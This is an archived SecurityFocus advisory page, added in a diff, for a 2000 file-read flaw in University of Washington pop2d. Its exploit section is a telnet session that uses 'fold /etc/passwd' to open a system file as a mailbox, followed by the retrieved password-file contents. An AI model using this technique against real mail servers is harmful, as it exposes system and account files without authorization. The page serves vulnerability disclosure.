@@ -1,0 +1,146 @@
+#bid1484<p><b><span style="font-size: 18pt;">Univ. of Washington pop2d Remote File Read Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1484/info">info</a><br><a href="http://www.securityfocus.com/bid/1484/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1484/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1484/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1484/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1484
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 14 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 14 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was reported to SecurityFocus.com on July 14, 2000 by &lt;mandark@mandark.jumpline.com&gt;
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					University of Washington pop2d 4.55 <br/>
+<span class="related">
+						
+							+ 
+						
+						University of Washington imap 4.7 c<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						University of Washington imap 4.7 b<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						University of Washington imap 4.7 a<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						University of Washington imap 4.7 <br/>
+</span>
+					
+				
+					University of Washington pop2d 4.54 <br/>
+<span class="related">
+						
+							+ 
+						
+						University of Washington imap 4.6 <br/>
+</span>
+					
+				
+					University of Washington pop2d 4.51 <br/>
+<span class="related">
+						
+							+ 
+						
+						University of Washington imap 4.5 <br/>
+</span>
+					
+				
+					University of Washington pop2d 4.46 <br/>
+<span class="related">
+						
+							+ 
+						
+						University of Washington imap 4.4 <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	mandark@mandark mandark$ telnet localhost 109<br/>Trying 127.0.0.1...<br/>Connected to localhost.localdomain.<br/>Escape character is '^'.<br/>+ POP2 localhost.localdomain v4.46 server ready<br/>helo mandark blehpasshere<br/>#1 messages in /var/spool/mail/mandark<br/>read 1<br/>=389 characters in message 1<br/>retr <br/>Return-Path: &lt;root@mandark.jumpline.com&gt;<br/>Received: (from root@localhost)<br/>        by mandark.jumpline.com (8.10.1/8.10.1) id e6EGS7C27037<br/>        for mandark@localhost; Fri, 14 Jul 2000 12:28:07 -0400 <br/>Date: Fri, 14 Jul 2000 12:28:07 -0400<br/>From: root &lt;root@mandark.jumpline.com&gt;<br/>Message-Id: &lt;200007141628.e6EGS7C27037@mandark.jumpline.com&gt;<br/>To: mandark@mandark.jumpline.com<br/>Status: RO<br/><br/>message is here...<br/><br/>acks<br/>=0 No more messages<br/>fold /etc/passwd   <br/>#1 messages in /etc/passwd<br/>read 1<br/>=1178 characters in message 1<br/>retr<br/>Date: Thu, 13 Jul 2000 16:50:07 -0400<br/>From: root@mandark.jumpline.com <br/>Subject: /etc/passwd<br/>MIME-Version: 1.0   <br/>Content-Type: TEXT/PLAIN; charset=US-ASCII<br/>Status:<br/><br/>root:x:0:0:root:/root:/bin/bash<br/>bin:x:1:1:bin:/bin:<br/>daemon:x:2:2:daemon:/sbin:<br/>lp:x:4:7:lp:/var/spool/lpd:<br/>sync:x:5:0:sync:/sbin:/bin/sync<br/>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br/>halt:x:7:0:halt:/sbin:/sbin/halt<br/>mail:x:8:12:mail:/var/spool/mail:<br/>news:x:9:13:news:/var/spool/news:<br/>uucp:x:10:14:uucp:/var/spool/uucp:<br/>operator:x:11:0:operator:/root:   <br/>games:x:12:100:games:/usr/games:<br/>gopher:x:13:30:gopher:/usr/lib/gopher-data:<br/>ftp:x:14:50:FTP User:/home/ftp:    <br/>nobody:x:99:99:Nobody:/: <br/>xfs:x:100:101:X Font Server:/etc/X11/fs:/bin/false<br/>postfix:x:101:104:postfix:/var/spool/postfix:<br/>gdm:x:0:0::/home/gdm:/bin/bash<br/>mandark:x:500:503::/home/mandark:/bin/bash<br/>godie:x:0:0::/home/godie:/bin/bash<br/>mp3:x:501:506::/mp3:/bin/bash<br/>chefo:x:502:507::/home/chefo:/bin/bash  <br/>crunch:x:503:508::/home/crunch:/bin/bash<br/>gsx:x:505:510::/home/gsx:/bin/csh<br/>matt:x:506:511::/home/matt:/bin/bash<br/>lyw0d:x:507:512::/home/lyw0d:/bin/bash
+	
+		<ul>
+</ul>
+</div>
